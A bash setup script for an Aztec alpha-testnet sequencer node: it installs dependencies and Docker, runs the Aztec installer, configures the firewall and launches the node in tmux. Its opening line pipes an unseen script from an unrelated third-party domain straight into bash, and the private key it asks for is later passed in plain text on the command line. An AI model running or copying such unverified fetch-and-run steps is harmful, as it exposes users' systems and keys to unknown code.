#!/bin/bash

curl -s https://data.zamzasalim.xyz/file/uploads/asclogo.sh | bash
sleep 5

# setup_aztec.sh
# Script to set up Aztec node with dependencies, Docker, and firewall configuration

# Exit on any error
set -e

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Prompt for required inputs
echo "Please provide the following details:"
read -p "Enter ETH Sepolia RPC URL: " RPC_URL
read -p "Enter ETH Beacon Sepolia RPC URL: " BEACON_URL
read -p "Enter Sequencer Private Key (0x...): " VALIDATOR_PRIVATE_KEY
read -p "Enter Sequencer Address (0x...): " COINBASE_ADDRESS
read -p "Enter IP VPS: " P2P_IP

# Validate inputs
if [ -z "$RPC_URL" ] || [ -z "$BEACON_URL" ] || [ -z "$VALIDATOR_PRIVATE_KEY" ] || [ -z "$COINBASE_ADDRESS" ] || [ -z "$P2P_IP" ]; then
    echo "Error: All inputs are required."
    exit 1
fi

echo "Starting Aztec node setup..."

# Step 1: Update packages
echo "Updating system packages..."
sudo apt-get update && sudo apt-get upgrade -y

# Step 2: Install required packages
echo "Installing required packages..."
sudo apt install -y curl iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip libleveldb-dev

# Step 3: Install Docker (skip if already installed)
if ! command_exists docker; then
    echo "Installing Docker..."
    sudo apt update -y && sudo apt upgrade -y

    # Remove conflicting packages
    for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do
        sudo apt-get remove -y $pkg || true
    done

    # Add Docker's official GPG key
    sudo apt-get update
    sudo apt-get install -y ca-certificates curl gnupg
    sudo install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
    sudo chmod a+r /etc/apt/keyrings/docker.gpg

    # Set up the Docker repository
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
      $(source /etc/os-release && echo "$VERSION_CODENAME") stable" | \
      sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

    # Install Docker
    sudo apt update -y && sudo apt upgrade -y
    sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

    # Test Docker
    echo "Testing Docker installation..."
    sudo docker run hello-world

    # Enable and restart Docker service
    sudo systemctl enable docker
    sudo systemctl restart docker
else
    echo "Docker is already installed, skipping..."
fi

# Step 4: Install Aztec Tools
echo "Installing Aztec Tools..."
bash -i <(curl -s https://install.aztec.network)

# Verify Aztec installation
echo "Verifying Aztec installation..."
if command_exists aztec; then
    echo "Aztec installed successfully."
else
    echo "Error: Aztec installation failed."
    exit 1
fi

# Update Aztec
echo "Updating Aztec to alpha-testnet..."
aztec-up alpha-testnet

# Step 5: Configure Firewall
echo "Configuring firewall..."
sudo ufw allow 22
sudo ufw allow ssh
sudo ufw allow 40400
sudo ufw allow 8080
sudo ufw enable
echo "y" | sudo ufw enable  # Auto-confirm enabling firewall

# Step 6: Start Tmux session
echo "Starting tmux session..."
if ! command_exists tmux; then
    echo "Installing tmux..."
    sudo apt install -y tmux
fi
tmux new-session -d -s aztec

# Step 7: Run Sequencer Node
echo "Starting Aztec Sequencer Node in tmux session..."
tmux send-keys -t aztec "aztec start --node --archiver --sequencer \
  --network alpha-testnet \
  --l1-rpc-urls $RPC_URL \
  --l1-consensus-host-urls $BEACON_URL \
  --sequencer.validatorPrivateKey $VALIDATOR_PRIVATE_KEY \
  --sequencer.coinbase $COINBASE_ADDRESS \
  --p2p.p2pIp $P2P_IP \
  --p2p.maxTxPoolSize 1000000000" C-m

echo "Setup complete! Aztec Sequencer Node is running in tmux session 'aztec'."
echo "To attach to the tmux session, run: tmux a -t aztec"
echo "To detach from the tmux session, press: Ctrl+b, then d"
